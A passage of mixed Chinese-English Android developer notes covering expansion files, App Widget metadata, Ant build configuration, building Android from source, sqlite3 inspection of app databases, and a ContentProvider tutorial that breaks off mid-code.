 * 补丁文件(PatchExpansionFile): 用作主扩展文件的后续升级
However, even if your application update requires only a new patch expansion file, you still must upload a new APK with an updated versionCode in the manifest. (The Developer Console does not allow you to upload an expansion file to an existing APK.)
Note: The patch expansion file is semantically the same as the main expansion file—you can use each file any way you want. The system does not use the patch expansion file to perform patching for your app. You must perform patching yourself or be able to distinguish between the two files.
# 文件格式
Each expansion file you upload can be any format you choose (ZIP, PDF, MP4, etc.). You can also use the JOBB tool to encapsulate and encrypt a set of resource files and subsequent patches for that set. Regardless of the file type, Google Play considers them opaque binary blobs and renames the files using the following scheme:
```
[main|patch].<expansion-version>.<package-name>.obb
```
There are three components to this scheme:
main or patch
Specifies whether the file is the main or patch expansion file. There can be only one main file and one patch file for each APK.
<expansion-version>
This is an integer that matches the version code of the APK with which the expansion is first associated (it matches the application's android:versionCode value).
"First" is emphasized because although the Developer Console allows you to re-use an uploaded expansion file with a new APK, the expansion file's name does not change—it retains the version applied to it when you first uploaded the file.
<package-name>
Your application's Java-style package name.
For example, suppose your APK version is 314159 and your package name is com.example.app. If you upload a main expansion file, the file is renamed to:
main.314159.com.example.app.obb
# 参考
  * http://developer.android.com/google/play/expansion-files.html
# App Widgets
# 添加receiver
```xml
<receiver android:name="ExampleAppWidgetProvider" >
    <intent-filter>
        <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
    </intent-filter>
    <meta-data android:name="android.appwidget.provider" android:resource="@xml/example_appwidget_info" />
</receiver>
```
# Metadata
```
<appwidget-provider xmlns:android="http://schemas.android.com/apk/res/android"
    android:minWidth="294dp"
    android:minHeight="72dp"
    android:updatePeriodMillis="86400000"
    android:previewImage="@drawable/preview"
    android:initialLayout="@layout/example_appwidget"
    android:configure="com.example.android.ExampleAppWidgetConfigure" 
    android:resizeMode="horizontal|vertical"
    android:widgetCategory="home_screen|keyguard"
    android:initialKeyguardLayout="@layout/example_keyguard">
</appwidget-provider>
```
Here's a summary of the <appwidget-provider> attributes:
The values for the minWidth and minHeight attributes specify the minimum amount of space the App Widget consumes by default. The default Home screen positions App Widgets in its window based on a grid of cells that have a defined height and width. If the values for an App Widget's minimum width or height don't match the dimensions of the cells, then the App Widget dimensions round up to the nearest cell size.
See the App Widget Design Guidelines for more information on sizing your App Widgets.
Note: To make your app widget portable across devices, your app widget's minimum size should never be larger than 4 x 4 cells.
The minResizeWidth and minResizeHeight attributes specify the App Widget's absolute minimum size. These values should specify the size below which the App Widget would be illegible or otherwise unusable. Using these attributes allows the user to resize the widget to a size that may be smaller than the default widget size defined by the minWidth and minHeight attributes. Introduced in Android 3.1.
See the App Widget Design Guidelines for more information on sizing your App Widgets.
The updatePeriodMillis attribute defines how often the App Widget framework should request an update from the AppWidgetProvider by calling the onUpdate() callback method. The actual update is not guaranteed to occur exactly on time with this value and we suggest updating as infrequently as possible—perhaps no more than once an hour to conserve the battery. You might also allow the user to adjust the frequency in a configuration—some people might want a stock ticker to update every 15 minutes, or maybe only four times a day.
Note: If the device is asleep when it is time for an update (as defined by updatePeriodMillis), then the device will wake up in order to perform the update. If you don't update more than once per hour, this probably won't cause significant problems for the battery life. If, however, you need to update more frequently and/or you do not need to update while the device is asleep, then you can instead perform updates based on an alarm that will not wake the device. To do so, set an alarm with an Intent that your AppWidgetProvider receives, using the	AlarmManager. Set the alarm type to either ELAPSED_REALTIME or RTC, which will only deliver the alarm when the device is awake. Then set updatePeriodMillis to zero ("0").
The initialLayout attribute points to the layout resource that defines the App Widget layout.
The configure attribute defines the Activity to launch when the user adds the App Widget, in order for him or her to configure App Widget properties. This is optional (read Creating an App Widget Configuration Activity below).
The previewImage attribute specifies a preview of what the app widget will look like after it's configured, which the user sees when selecting the app widget. If not supplied, the user instead sees your application's launcher icon. This field corresponds to the android:previewImage attribute in the <receiver> element in the AndroidManifest.xml file. For more discussion of using previewImage, see Setting a Preview Image. Introduced in Android 3.0.
The autoAdvanceViewId attribute specifies the view ID of the app widget subview that should be auto-advanced by the widget's host. Introduced in Android 3.0.
The resizeMode attribute specifies the rules by which a widget can be resized. You use this attribute to make homescreen widgets resizeable—horizontally, vertically, or on both axes. Users touch-hold a widget to show its resize handles, then drag the horizontal and/or vertical handles to change the size on the layout grid. Values for the resizeMode attribute include "horizontal", "vertical", and "none". To declare a widget as resizeable horizontally and vertically, supply the value "horizontal|vertical". Introduced in Android 3.1.
The widgetCategory attribute declares whether your App Widget can be displayed on the home screen, the lock screen (keyguard), or both. Values for this attribute include "home_screen" and "keyguard". A widget that is displayed on both needs to ensure that it follows the design guidelines for both widget classes. For more information, see Enabling App Widgets on the Lockscreen. The default value is "home_screen". Introduced in Android 4.2.
The initialKeyguardLayout attribute points to the layout resource that defines the lock screen App Widget layout. This works the same way as the android:initialLayout, in that it provides a layout that can appear immediately until your app widget is initialized and able to update the layout. Introduced in Android 4.2.
See the AppWidgetProviderInfo class for more information on the attributes accepted by the <appwidget-provider> element.
# 参考
 * http://developer.android.com/guide/topics/appwidgets/index.html#MetaData
# Bonny Box
# 依赖库
 * core
 * bidget
# 模型
订阅接收模式.
# 模块
# SystemTable
 1. SystemTable用于缓存各种各样的频道信息
 2. SystemTable维护了若干watchers, 用于收集信息.
  * 信息的收集由对应的watcher实现
  * watcher有如下类型:
    1. StaticWatcher: 它的值在整个程序的生命周期里之多会取1次
    2. 一般的Watcher
      * 被动: 更新间隔为-1
      * 间隔: 更新时间为大于0的整数
# 后台服务
 * LocalService负责以轮寻的方式刷新间隔类型的watcher， 一旦刷新成功，并且有客户端订阅了该Watcher对应的频道， 一条SystemChangedEvent会发送到"ui"ListenerGroup中.
 * 对于被动Watcher, 可以向LocalService主动查询.
 * LocalService
# 
# bidget/moom
绘制仪表专用库
# ecj + Android SDK + ANT 构建
# 准备工作
 1. eclipse的java编译器(ecj.jar)
 2. Android SDK
 3. ant
经过配置，我们假定环境如下:
```sh
# ecj的位置
export ECJ_HOME=/opt/lib/ecj.jar
# Android SDK的位置
export ANDROID_HOME=/opt/android-sdk-linux_86
```
使用ant构建Android工程的整个过程由以下几个ant脚本构成:
 * $ANDROID_HOME/tools/main_rules.xml 
 * $ANDROID_HOME/tools/lib_rules.xml
 * $ANDROID_HOME/tools/test_rules.xml
 * $PROJECT_DIR/build.xml (可以由android create/update project 命令生成)
我们需要修改build.xml, 首先配置编译器:
```xml
  <property name="build.compiler" value="org.eclipse.jdt.core.JDTCompilerAdapter"/>  <!-- 使用ecj进行编译 -->
  <property name="java.target" value="1.6" />
  <property name="java.source" value="1.6" />
```
而后配置编译过程, 由*.java编译出*.class这个步骤是由compile这个target定义的， 因此我们需要修改其中的部分参数，包括
 * Android framework jar包的位置
 * 忽略Android对关键jar包的校验
```xml
 <target name       ="compile" 
         depends    ="-pre-build, -aidl, -resource-src, -pre-compile" 
         description="*.java ---> *.class">
    <if condition="${manifest.hasCode}">
      <then>
        <!-- If android rules are used for a test project, its classpath should include
             tested project's location -->
        <condition property="extensible.classpath" value="${tested.project.absolute.dir}/bin/classes" else=".">
          <isset property="tested.project.absolute.dir"/>
        </condition>
        <condition property="extensible.libs.classpath" value="${tested.project.absolute.dir}/libs" else="${jar.libs.dir}">
          <isset property="tested.project.absolute.dir"/>
        </condition>
        <javac encoding="${java.encoding}" 
               source="${java.source}" 
               target="${java.target}" 
               debug="true" 
               extdirs="" 
               destdir="${out.classes.absolute.dir}" 
               bootclasspath="${internal.classpath}"    <!-- framework jar 包的路径 -->
               bootclasspathref="android.target.classpath" 
               verbose="${verbose}" 
               classpath="${extensible.classpath}" 
               classpathref="jar.libs.ref">
          <src path="${source.absolute.dir}"/>
          <src path="${gen.absolute.dir}"/>
          <src refid="project.libraries.src"/>
          <!-- 下面这一句就是强制使用内部jar，忽略校验-->
          <compilerarg line="-warn:+forbidden"/>
          <classpath>
            <fileset dir="${extensible.libs.classpath}" includes="*.jar"/>
          </classpath>
        </javac>
      </then>
      <else>
        <echo>hasCode = false. Skipping...</echo>
      </else>
    </if>
  </target>
```
# build.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project name="PansiMsg" default="help">
  <!-- The local.properties file is created and updated by the 'android'
       tool.
       It contains the path to the SDK. It should *NOT* be checked into
       Version Control Systems. -->
  <property environment="env" />
  <property file="pansi.properties" />
  <!-- NOTE(amas): setup ejt as javac -->
  <property name="build.compiler" value="org.eclipse.jdt.core.JDTCompilerAdapter"/>
  <property name="java.target" value="1.6" />
  <property name="java.source" value="1.6" />
  
  <!-- ENDNOTE -->
  <!-- The build.properties file can be created by you and is never touched
       by the 'android' tool. This is the place to change some of the
       default property values used by the Ant rules.
       Here are some properties you may want to change/update:
source.dir
The name of the source directory. Default is 'src'.
out.dir
The name of the output directory. Default is 'bin'.
Properties related to the SDK location or the project target should
be updated using the 'android' tool with the 'update' action.
This file is an integral part of the build system for your
application and should be checked into Version Control Systems.
  -->
  <property file="build.properties" />
  <property name="version.code" value="911" />
  <property name="version.chid" value="" />
  <property name="opt.findbug" value="" />
  <property name="opt.patch.debugoff" value=".patch/debug-off.patch" />
  <!-- final release dir -->
  <property name="dir.final.output" value="${env.WORKSPACE}/bin" />
  
  <!-- The default.properties file is created and updated by the 'android'
       tool, as well as ADT.
       This file is an integral part of the build system for your
       application and should be checked into Version Control Systems. -->
  <property file="default.properties" />
  <!-- Custom Android task to deal with the project target, and import the
       proper rules.
       This requires ant 1.6.0 or above. -->
  <path id="android.antlibs">
    <pathelement path="${sdk.dir}/tools/lib/anttasks.jar" />
    <pathelement path="${sdk.dir}/tools/lib/sdklib.jar" />
    <pathelement path="${sdk.dir}/tools/lib/androidprefs.jar" />
  </path>
  <taskdef name="setup"
           classname="com.android.ant.SetupTask"
           classpathref="android.antlibs" />
  <!-- extension targets. Uncomment the ones where you want to do custom work
       in between standard targets -->
  <target name="-pre-build" depends="-set-channel, -debugoff">
    <tstamp>
      <format property="var.ctime" pattern="yyyyMMdd-hh-mm" />
    </tstamp>
    <exec executable="git" outputproperty="var.git.version.shot">
      <arg value="rev-parse"/>
      <arg value="--short"/>
      <arg value="HEAD"/>
    </exec>
    <mkdir dir="${dir.final.output}"/>
    <echo> [amas] : 准备开始构建 </echo>
    <echo> [amas] : 版本号   = ${version.code}           </echo>
    <echo> [amas] : 渠道号   = ${version.chid}           </echo>
    <echo> [amas] : 构建时间 = ${var.ctime}              </echo>
    <echo> [amas] : 代码版本 = ${var.git.version.shot}   </echo>
    <echo> [amas] : -------------------------------------</echo>
    <echo> [amas] : 输出到   = ${dir.final.output}       </echo>
  </target>
  <target name="-post-build">
    <echo> [amas] : 基本构建完毕 </echo>
  </target>
<!--
[This is typically used for code obfuscation.
Compiled code location: ${out.classes.absolute.dir}
If this is not done in place, override ${out.dex.input.absolute.dir}]
<target name="-post-compile">
</target>
  -->
  <!-- Execute the Android Setup task that will setup some properties
       specific to the target, and import the build rules files.
The rules file is imported from
<SDK>/platforms/<target_platform>/ant/ant_rules_r#.xml
To customize existing targets, there are two options:
- Customize only one target:
- copy/paste the target into this file, *before* the
<setup> task.
- customize it to your needs.
- Customize the whole script.
- copy/paste the content of the rules files (minus the top node)
into this file, *after* the <setup> task
- disable the import of the rules by changing the setup task
below to <setup import="false" />.
- customize to your needs.
  -->
 <setup />
 <target name       ="compile" 
         depends    ="-pre-build, -aidl, -resource-src, -pre-compile" 
         description="*.java ---> *.class">
    <if condition="${manifest.hasCode}">
      <then>
        <!-- If android rules are used for a test project, its classpath should include
             tested project's location -->
        <condition property="extensible.classpath" value="${tested.project.absolute.dir}/bin/classes" else=".">
          <isset property="tested.project.absolute.dir"/>
        </condition>
        <condition property="extensible.libs.classpath" value="${tested.project.absolute.dir}/libs" else="${jar.libs.dir}">
          <isset property="tested.project.absolute.dir"/>
        </condition>
        <javac encoding="${java.encoding}" 
               source="${java.source}" 
               target="${java.target}" 
               debug="true" 
               extdirs="" 
               destdir="${out.classes.absolute.dir}" 
               bootclasspath="${internal.classpath}" 
               bootclasspathref="android.target.classpath" 
               verbose="${verbose}" 
               classpath="${extensible.classpath}" 
               classpathref="jar.libs.ref">
          <src path="${source.absolute.dir}"/>
          <src path="${gen.absolute.dir}"/>
          <src refid="project.libraries.src"/>
          <!-- 下面这一句就是强制使用内部jar，忽略校验-->
          <compilerarg line="-warn:+forbidden"/>
          <classpath>
            <fileset dir="${extensible.libs.classpath}" includes="*.jar"/>
          </classpath>
        </javac>
      </then>
      <else>
        <echo>hasCode = false. Skipping...</echo>
      </else>
    </if>
  </target>
  <!--====================================================[ 设置渠道号 ] -->
  <target name = "-set-channel">
    <exec executable="xmlstarlet" output="AndroidManifest.xml">
      <arg value="ed"/>
      <arg value="-P"/>
      <arg value="-N"/>
      <arg value="android=http://schemas.android.com/apk/res/android"/>
      <arg value="-u"/>
      <arg value="/manifest/application/meta-data[@android:name='UMENG_CHANNEL']/@android:value"/>
      <arg value="-v"/>
      <arg value="${version.chid}"/>
      <arg value="AndroidManifest.xml"/>
    </exec>
  </target>
  <!--====================================================[ 关闭Log信息 ] -->
  <target name = "-debugoff">
    <exec executable="git">
      <arg value="apply"/>
      <arg value="${opt.patch.debugoff}"/>
    </exec>
  </target>
  <!--====================================================[ 优化APK大小 ] -->
  <target name = "+release" depends="release">
    <echo>压缩资源: ${out.release.file}</echo>
    <echo>输出到:${out.absolute.dir}/${version.code}_${ant.project.name}_${var.ctime}_${var.git.version.shot}_${version.chid}.final.apk</echo>
    <exec executable="repackage">
      <arg value="-apk"/>
      <arg value="${out.release.file}"/>
      <arg value="-o"/>
      <arg value="${dir.final.output}/${version.code}_${ant.project.name}_${var.ctime}_${var.git.version.shot}_${version.chid}.final.apk"/>
    </exec>
  </target>
  
  <!--====================================================[ 清理输出目录 ] -->
  <target name = "rm-output-dir">
      <delete dir="${dir.final.output}"/>
  </target>
</project>
```
 * -debugoff 用于关闭log信息
 * +release 用于优化最终安装包
 * rm-output-dir 清除输出目录
# local.properties
```sh
internal.classpath=${env.ANDROID_INTERNAL_LIBS_9}            # 内部jar包的路径的
key.store=${env.KEYSTORE_FILE}                               # 签名文件
key.alias=${env.KEYSTORE_ALISE}                              # 别名
key.store.password=${env.KEYSTORE_PASS_S}                    # 密码
key.alias.password=${env.KEYSTORE_PASS_A}                    # 别名密码
android.library.reference.1=${env.PATH_TO_YOUR_LIB_PROJECT}. # 依赖的第三方源码库
sdk.dir=${env.ANDROID_HOME}                                  # Android SDK安装目录
```
# default.properties
此文件中主要配置两项内容:
 * 工程的APILevel 
 * proguard配置文件的路径(如果不使用proguard简单注释掉即可)
```xml
target=android-8
proguard.config=proguard.flags
```
# proguard.flags
proguard配置文件，不再赘述.
# Sun javac + Android SDK + ANT 构建
如果不依赖于内部jar包，直接使用下面的命令创建Android工程即可
```sh
$ android create project -a MainActivity -k org.android.demo -p ./HelloWorld -n HelloWorld -t 8
--- option ---
-a             -- Name of the default Activity that is created <required>                                                                                                              
-k             -- Android package name for the application <required>                                                                                                                  
-p             -- The new projects directory <required>                                                                                                                                
--package  -n  -- Project name                                                                                                                                                         
-t             -- Target ID of the new project  <required>
```
# Build Android 4.0 on CentOS
```
Build Server:CentOS 6.0 X86_64
TargetAndroid Version:  Ice Cream Sandwich 4.0
JDK: 1.6.0_29
OS Image Download site: http://mirrors.163.com/centos/6.0/isos/x86_64/CentOS-6.0-x86_64-bin-DVD1.iso
Android Source Code Download Page: http://source.android.com/
JDK Download site: http://www.oracle.com/technetwork/java/javase/downloads/index.html
 
1. Build yourenvironment, install the OS and patch the essential packages.
linuxdba--> yum install make glibc libstdc++ bison flexncurses zlib libc git compat-gcc gcc binutils curl ncurses-devel ncurses-libssquashfs libGL libXrender libX11
Download JDKand install.
2. Downloadthe Repo script and ensure it is executable:
linuxdba--> curl https://dl-ssl.google.com/dl/googlesource/git-repo/repo >/usr/bin/repo
linuxdba--> chmod +x  /usr/bin/repo
3. Createyour build home directory/working directory.
linuxdba--> mkdir /android_ics
linuxdba--> cd /android_ics
4. Init therepo client.
4.1 Downloadthe "master" code.
linuxdba-->  repo init-u https://android.googlesource.com/platform/manifest
4.2 Downloadone branch other than "master", specify it with -b:
linuxdba--> repo init -uhttps://android.googlesource.com/platform/manifest -b android-4.0.1_r1
5. Downloadsource code.
linuxdba--> repo sync
6. Initializethe environment with the build/envsetup.sh.
linuxdba--> source build/envsetup.sh
includingdevice/samsung/maguro/vendorsetup.sh
includingdevice/samsung/tuna/vendorsetup.sh
including device/ti/panda/vendorsetup.sh
including sdk/bash_completion/adb.bash
7. Choose onetarget to build with lunch
linuxdba--> lunch
You're building on Linux
Lunch menu... pick a combo:
    1. full-eng
    2. full_x86-eng
    3. vbox_x86-eng
    4. full_maguro-userdebug
    5. full_tuna-userdebug
    6. full_panda-eng
 
Which would you like? [full-eng] 2
 
============================================
PLATFORM_VERSION_CODENAME=REL
PLATFORM_VERSION=4.0.1
TARGET_PRODUCT=full_x86
TARGET_BUILD_VARIANT=eng
TARGET_BUILD_TYPE=release
TARGET_BUILD_APPS=
TARGET_ARCH=x86
TARGET_ARCH_VARIANT=x86-atom
HOST_ARCH=x86
HOST_OS=linux
HOST_BUILD_TYPE=release
BUILD_ID=ITL41D
============================================
8. Start to build by "make", you could enhance the task with a parallel argument"-jN"
linuxdba--> make
or
linuxdba--> make -j2, make -j4..... (for multi CPU/PROCESSOR)
9. ENJOY.
```
# !AndroidContentProvider(内容提供者) =
# URI
 * '*' may be used as a wild card for any text
 * '#' may be used as a wild card for numbers
内容提供者是一种封装机制，而不是数据的访问机制。你需要一个实际的数据访问如SQLite或通过网络机制访问底层数据源。因此，内容提供者只是在应用程序间共享数据的一种抽象。对于内部数据，应用程序可以使用任何的数据存储/访问机制，一下是一些合适的方式：
 * Preferences: 可以存储键值对的数据。
 * Files: 文件存储
 * SQLite: 关系数据库，每个应用程序中都能创建一个私有的数据库。
 * Network: 通过网络检索或者存储数据。
# 在模拟器和可用设备中查看数据库 ==
可以使用adb命令在已连接的设备上打开shell
```
#!sh
$ adb shell
```
需要访问这个文件夹查看数据库列表
```
#!sh
ls /data/data
```
如果包含一个查找命令，你就可以查看所有的*.db文件。但是除了ls以外没有更好的方法了。最简便的方法是：
```
#!sh
ls  -R /data/data/*/databases
# 使用这个命令，你将看到Android列出所有的数据库（这里只列举常用，你的设备上可能还有很多）形式如下：
/data/data/com.ai.android.book.provider/databases:
bool.db
book.db
/data/data/com.android.alarmclock/databases:
alarms.db
/data/data/com.android.browser/databases:
browser.db
webviewCache.db
webview.db
/data/data/com.android.email/databases:
EmailProvider.db
EmailProviderBody.db
/data/data/com.android.globalsearch/databases:
shortcuts-log.db
/data/data/com.android.launcher/databases:
launcher.db
/data/data/com.android.providers.contacts/databases:
contacts2.db
/data/data/com.android.providers.downloads/databases:
downloads.db
/data/data/com.android.providers.media/databases:
external-ff32e0b.db
internal.db
/data/data/com.android.providers.settings/databases:
settings.db
/data/data/com.android.providers.telephony/databases:
telephony.db
mmssms.db
/data/data/com.pansi.msg/databases:
webview.db
webviewCache.db
pansi.db
```
这样就很方便的找到所有*.db数据
你可以调用sqlite3去查看这些数据库
```
#!sh
$ sqlite3 /data/data/com.android.providers.contacts/databases/contacts.db
```
# Sqlite快速入门 ==
# SQL的指令格式 ===
SQL指令都是以分号（;）结尾的。如果遇到两个减号（--）则代表注解，sqlite3会略过去。
# 建立资料表 ===
假设我们要建一个名叫film的资料表，只要键入以下指令就可以了：
```sh
sqlite>create table film(title, length, year, starring);
```
这样我们就建立了一个名叫film的资料表，里面有name、length、year、starring四个字段。
这个create table指令的语法为：
```sh
sqlite>create table table_name(field1, field2, field3, ...);
```
table_name是资料表的名称，fieldx则是字段的名字。sqlite3与许多SQL数据库软件不同的是，它不在乎字段属于哪一种资料型态：sqlite3的字段可以储存任何东西：文字、数字、大量文字（blub），它会在适时自动转换。
# 查询资料 ===
键入以下命令查看数据库中所有的表：
```sh
sqlite>.tables
```
设置列头可见
```sh
sqlite>.headers on
```
我们首先简单介绍select的基本句型：
```sh
sqlite>select columns from table_name where expression;
```
最常见的用法，当然是倒出所有数据库的内容：
```sh
sqlite>select * from film;
```
如果资料太多了，我们或许会想限制笔数：
```sh
sqlite>select * from film limit 10;
```
或是照着电影年份来排列：
```sh
sqlite>select * from film order by year limit 10;
```
或是年份比较近的电影先列出来：
```sh
sqlite>select * from film order by year desc limit 10;
```
或是我们只想看电影名称跟年份：
```sh
select title, year from film order by year desc limit 10;
```
查所有茱蒂佛斯特演过的电影：
```sh
sqlite>select * from film where starring='Jodie Foster';
```
查所有演员名字开头叫茱蒂的电影('%' 符号便是 SQL 的万用字符）：
```sh
sqlite>select * from film where starring like 'Jodie%';
```
查所有演员名字以茱蒂开头、年份晚于1985年、年份晚的优先列出、最多十笔，只列出电影名称和年份：
```sh
sqlite>select title, year from film where starring like 'Jodie%' and year >= 1985 order by year desc limit 10;
```
有时候我们只想知道数据库一共有多少笔资料：
```sh
sqlite>select count(*) from film;
```
有时候我们只想知道1985年以后的电影有几部：
```sh
sqlite>select count(*) from film where year >= 1985;
```
# 在Android中查询数据库 ==
# 使用URI读取数据 ==
需要通过内容提供者提供的URI才能检索数据。因为这些URI定义都是唯一的，所以重要的是我们需要在调用之前查阅相关文档。Android中使用如下URI字符串提供了一些内容提供者的。
 
这些URI被定义在Android SDK的帮助类中：
 * !MediaStore.Images.Media.INTERNAL_CONTENT_URI
 * !MediaStore.Images.Media.EXTERNAL_CONTENT_URI
 * Contacts.People.CONTENT_URI
 
实际对应的值如下：
 * content://media/internal/images
 * content://media/external/images
 * content://contacts/people/
首先得获得URI，例如获得联系人People的URI
// content://contacts/people/
```java
Uri mContactsUri = Contacts.People.CONTENT_URI;
```
使用最好的方式检索数据
```java
Cursor cursor = getContentResolver().query(uri,null,//需要检索出那些列 projection
null, // 检索条件 selection
null,ContactsContract.Contacts.DISPLAY_NAME);//排序 order
```
请注意，projection是一个代表了列名的字符串数组。所以，除非你知道这些列名，否则你会发现很难创建projection。你可以再提供URI的同一个类中查看这些列名，由此，查看People类，你可以看到这些列名的定义：
 * DISPLAY_NAME
 * LAST_TIME_CONTACTED
 * NAME
 * NOTES
 * PHOTO_VERSION
 * SEND_TO_VOICE_MAIL
 * STARRED
 * TIMES_CONTACTED
例如：
```java
string[] projection = new string[] {
People._ID,
People.NAME,
People.NUMBER,
};
```
你可以在SDK文档的android.provider.Contacts.PerpleColumns类中查看到更多的列。你可以使用的如下[http://developer.android.com/reference/android/provider/Contacts.PeopleColumns.html Content URI]
selection就是sqlite语句中where之后的语句，比如只查询联系人名字以“电话”开头的项目(请注意空格（" like "）是必须的，否则会报错)：
```java
cursor = getContentResolver().query(uri,null,People.DISPLAY_NAME+" like "+"'电话%'", null,null);
```
而最后一项oder就是sqlite语句中"order by "之后的语句，比如我想已People.DISPLAY_NAME倒序排列，应如下：
```java
cursor = getContentResolver().query(uri,null,null, null,ContactsContract.Contacts.DISPLAY_NAME+" desc");
```
让我们重新回到游标，它包含了零条或者多条记录。列顺序和类型特定于内容提供者。然而，每一行都有一个默认的列_id为每一个的唯一标识。
 
# 使用游标 ===
这里有关于游标的一些特点：
* 游标是行数据的集合
* 在使用游标读取数据之前，你需要使用moveToFirst()方法。因为游标的起始位置在第一行数据之前。
* 需要知道列名
* 需要知道列的类型
* 所有的操作都居于列号，所以你必须把列名转换成列号
* 游标是任意游标（你可以向前，向后读取，也可以越过几行进行读取）
* 因为游标是任意游标，所以你必须通过行数量来访问
* 最后访问完后，必须关闭游标
Android提供了一组方法用于操作游标。下面的代码用于判断游标是否是一个空游标，如果不为空，则逐行读取数据。
一般取得cursor后，如下取值：
```java
if(null != cursor){
    try {
        while(cursor.moveToNext()){
        int nameColumnIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
        String name = cursor.getString(nameColumnIndex);
        //对取到的值做操作
        }                 
    } finally {
        cursor.close();
    }
}
```
# 实现ContentProvider ==
我们已经讨论了如何查询内容提供者的数据，但是还没有讨论如何定义一个内容提供者。要定义一个内容提供者，你需要继承android.content.ContentProvider以及实现以下方法：
 * query
 * insert
 * update
 * getType
 
在实现这些方法之前，你需要学习一些知识。我们将以示例详细的说明实现一个内容提供者的步骤：
 1. 准备数据库，URI，列名等等，然后创建一个定义类，定义所需要的元数据。
 2. 继承抽象类ContentProvider
 3. 实现query,insert,update,delete,和getType方法
 4. 在manifest文件中注册内容提供者
# 准备数据库 ===
首先，我们需要创建一个包含书籍信息的数据库。这个数据库（book）只包含一个叫做 books的表，表中的列有：name,isbn和author。这些列名被定义在了metadata类中。在这个示例中定义了一个名为 BookProviderMetaData的类用来定义常量信息，该类得代码如下：
```java
public class BookProviderMetaData {
    public static final String AUTHORITY = "com.androidbook.provider.BookProvider";
    public static final String DATABASE_NAME = "book.db";
    public static final int DATABASE_VERSION = 1;
    public static final String BOOKS_TABLE_NAME = "books";
    private BookProviderMetaData() {}
    //inner class describing BookTable
    public static final class BookTableMetaData implements BaseColumns {
        private BookTableMetaData() {}
        public static final String TABLE_NAME = "books";
        //uri and MIME type definitions
        public static final Uri CONTENT_URI = Uri.parse("content://" + AUTHORITY + "/books");
        public static final String CONTENT_TYPE = "vnd.android.cursor.dir/vnd.androidbook.book";
        public static final String CONTENT_ITEM_TYPE = "vnd.android.cursor.item/vnd.androidbook.book";
        public static final String DEFAULT_SORT_ORDER = "modified DESC";
        //Additional Columns start here.
        //string type
        public static final String BOOK_NAME = "name";
        //string type
        public static final String BOOK_ISBN = "isbn";
        //string type
        public static final String BOOK_AUTHOR = "author";
        //Integer from System.currentTimeMillis()
        public static final String CREATED_DATE = "created";
        //Integer from System.currentTimeMillis()
        public static final String MODIFIED_DATE = "modified";
    }
}
```
在BookProviderMetaData类中定义了权限名为：com.androidbook.provider.!BookProvider。这个将作为在Android manifest文件中的注册字符串。这个字符串构成了URI的前一部分。
 
在这个类中还包含了一个名为BookTableMetaData的内部类。在这个内部类中定义了一个标识books所有数据的URI。这个URI如下所示：
content://com.androidbook.provider.BookProvider/books
 
这个URI值保存在常量BookProviderMetaData.!BookTableMetaData.CONTENT_URI中。
 
在类BookTableMetaData中还定义了books表的所有数据以及单行数据的MIME类型。实现的内容提供者将会根据传入的URI返回这些常量。
 
然后BookTableMetaData中定义了一组列名：name,isbn,author ,createde（创建时间）和modified（最后一次更新时间），值得注意的是，在定义这些元数据的时候，类型要与数据库字段的类型保持一致。
 
BookTableMetaData类继承自BaseColumns类，在BaseColumns类中提供了标准的_id字段，这个字段代表了每行数据的ID。有了这些元数据的定义，我们已经实现了内容提供者。
# 扩展ContentProvider ===
为了实现BookProvider内容提供者得示例还需要继承ContentProvider类并且重写onCreate方法来创建数据库，然后实现 query,insert,update,delete和getType方法。本节涵盖数据库建立的步骤，而下面的部分将会对于 query,insert,update,delete和getType方法进行讲解。这些代码如下：
```java
public class BookProvider extends ContentProvider
{
//Logging helper tag. No significance to providers.
private static final String TAG = "BookProvider";
 
//Setup projection Map
//Projection maps are similar to "as" (column alias) construct
//in an sql statement where by you can rename the
//columns.
private static HashMap<String, String> sBooksProjectionMap;
static
{
sBooksProjectionMap = new HashMap<String, String>();
sBooksProjectionMap.put(BookTableMetaData._ID,
BookTableMetaData._ID);
//name, isbn, author
sBooksProjectionMap.put(BookTableMetaData.BOOK_NAME,
BookTableMetaData.BOOK_NAME);
sBooksProjectionMap.put(BookTableMetaData.BOOK_ISBN,
BookTableMetaData.BOOK_ISBN);
sBooksProjectionMap.put(BookTableMetaData.BOOK_AUTHOR,
BookTableMetaData.BOOK_AUTHOR);
//created date, modified date
sBooksProjectionMap.put(BookTableMetaData.CREATED_DATE,
BookTableMetaData.CREATED_DATE);
sBooksProjectionMap.put(BookTableMetaData.MODIFIED_DATE,
BookTableMetaData.MODIFIED_DATE);
}
 
//Setup URIs
//Provide a mechanism to identify
//all the incoming uri patterns.
private static final UriMatcher sUriMatcher;
private static final int INCOMING_BOOK_COLLECTION_URI_INDICATOR = 1;
private static final int INCOMING_SINGLE_BOOK_URI_INDICATOR = 2;
static {
sUriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
sUriMatcher.addURI(BookProviderMetaData.AUTHORITY, "books",
INCOMING_BOOK_COLLECTION_URI_INDICATOR);
sUriMatcher.addURI(BookProviderMetaData.AUTHORITY, "books/#",
INCOMING_SINGLE_BOOK_URI_INDICATOR);
}
/**
* Setup/Create Database
* This class helps open, create, and upgrade the database file.
*/
private static class DatabaseHelper extends SQLiteOpenHelper {
DatabaseHelper(Context context) {
super(context,
BookProviderMetaData.DATABASE_NAME,
null,
BookProviderMetaData.DATABASE_VERSION);
}
@Override
public void onCreate(SQLiteDatabase db)
{
Log.d(TAG,"inner oncreate called");
db.execSQL("CREATE TABLE " + BookTableMetaData.TABLE_NAME + " ("
+ BookTableMetaData._ID + " INTEGER PRIMARY KEY,"
+ BookTableMetaData.BOOK_NAME + " TEXT,"
+ BookTableMetaData.BOOK_ISBN + " TEXT,"
+ BookTableMetaData.BOOK_AUTHOR + " TEXT,"
+ BookTableMetaData.CREATED_DATE + " INTEGER,"
+ BookTableMetaData.MODIFIED_DATE + " INTEGER"
+ ");");
}
@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)
{
Log.d(TAG,"inner onupgrade called");
Log.w(TAG, "Upgrading database from version "
+ oldVersion + " to "
+ newVersion + ", which will destroy all old data");
db.execSQL("DROP TABLE IF EXISTS " +
BookTableMetaData.TABLE_NAME);
onCreate(db);
}
}
private DatabaseHelper mOpenHelper;
//Component creation callback
 
@Override
public boolean onCreate()
{
Log.d(TAG,"main onCreate called");
mOpenHelper = new DatabaseHelper(getContext());
return true;
}
@Override
public Cursor query(Uri uri, String[] projection, String selection,
String[] selectionArgs, String sortOrder)
{
